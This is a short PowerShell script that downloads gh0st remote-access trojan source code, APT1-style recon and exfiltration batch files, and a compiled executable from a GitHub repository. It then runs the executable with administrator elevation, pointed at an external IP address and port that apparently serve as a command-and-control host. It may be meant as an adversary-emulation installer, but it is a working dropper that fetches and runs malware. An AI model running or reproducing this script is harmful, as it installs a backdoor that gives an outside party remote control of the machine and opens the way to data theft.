$url1 = "https://raw.githubusercontent.com/JP3L/gh0st/master/_src/zombie/zombie.cpp"
$output1 = "C:\tmp\tools\gh0st.cpp”

$url2 = "https://raw.githubusercontent.com/JP3L/gh0st/master/_src/zombie/recon.bat"
$output2 = "C:\tmp\tools\recon.bat"

$url3 = "https://raw.githubusercontent.com/JP3L/gh0st/master/_src/zombie/exfil.bat"
$output3 = "C:\tmp\tools\exfil.bat"

$url4 = "https://github.com/JP3L/gh0st/blob/master/_build/Release/ghost.exp?raw=true"
$output4 = "C:\tmp\tools\gh0st.exe”

$start_time = Get-Date

Invoke-WebRequest -Uri $url1 -OutFile $output1
Write-Output "gh0st RAT source code with simplified chinese comments indicative of APT1 built in:`t" $output1 "`n"

Invoke-WebRequest -Uri $url2 -OutFile $output2
Write-Output "`n....Recon batch file from APT1 built in:`t" $output2 "`n"

Invoke-WebRequest -Uri $url3 -OutFile $output3
Write-Output "`n....Exfil batch file from APT1 built in:`t" $output3 "`n"

Invoke-WebRequest -Uri $url4 -OutFile $output4
Write-Output "gh0st executable built in:`t" $output4 "`n"

Write-Output "`n....Installing gh0st client..."

Write-Output "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
Write-Output "@@@@@@@@@@@@@@@@@@@@@NNNN@@@@@@@@@@@@@@@@@@@@@@@@@"
Write-Output "@@@@@@@@@@@@@@@@@N$g@@@@@g|MMMMNN@@@@@@@@@@@@@@@@@"
Write-Output "@@@@@@@@@@@@@@@@L$@@@@@@@@@@g,'TT|Y%@@@@@@@@@@@@@@"
Write-Output "@@@@@@@@@@@@@@@$$@@@@@@@@@@@@@g,    "%@@@@@@@@@@@@"
Write-Output "@@@@@@@@@@@@Nl@@@@@@@@@@@@@@@@@@W   | )@@@@@@@@@@@"
Write-Output "@@@@@@@@@@N|$@@@@@@@@@@@@@@@@@@@@@LL   )@@@@@@@@@@"
Write-Output "@@@@@@@@@T|$@@@@@@@@@@@@@@@@@@@@@@@k|   $@@@@@@@@@"
Write-Output "@@@@@@@@M&$@@@@@$@@@@@@@@@@@@NF$@@@@@L  )@@@@@@@@@"
Write-Output "@@@@@@@@$@@@@@@@@@$`  'D@@@P` ;@@@@@@@  ]@@@@@@@@@"
Write-Output "@@@@@@@@$@@@@@@@@@@@@@|g@@@@@@@@@@@@@@Lj@@@@@@@@@@"
Write-Output "@@@@@@@@$$@@@@@@@@@@@@g@@@@@@@@@@@@@@@@j@@@@@@@@@@"
Write-Output "@@@@@@@@@$@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
Write-Output "@@@@@@@@@@$@@@@@@@@@@@@@@@@@@@@@@@@@@@@$@@@@@@@@@@"
Write-Output "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@k,~)@@@@@@@@"
Write-Output "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@M$TL||%@@@@@@@"
Write-Output "@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@$$$&M^|'`$NRM$TT@"
Write-Output "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@$$$&&&@"
Write-Output "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%$$$$$$$$$@@@@@"
Write-Output "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@$$$$$$@@$@@@@@"
Write-Output "@@@@@@@@@@@@@@@@@@@@@@@@@@@N%%%$$@@@@@@@@$W@@MT|||"
Write-Output "@@@@@@@@@@@@@@@@@@$$$$$$$$$@@@@@@@@@@@@@@@JP3L@@@@"


Start-Process -FilePath $output4 -ArgumentList "223.167.108.2","27015" -Verb runAs
Write-Output "`n`n gh0st install complete.  `n Thanks for the fun."

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

# $error[0]|format-list -force
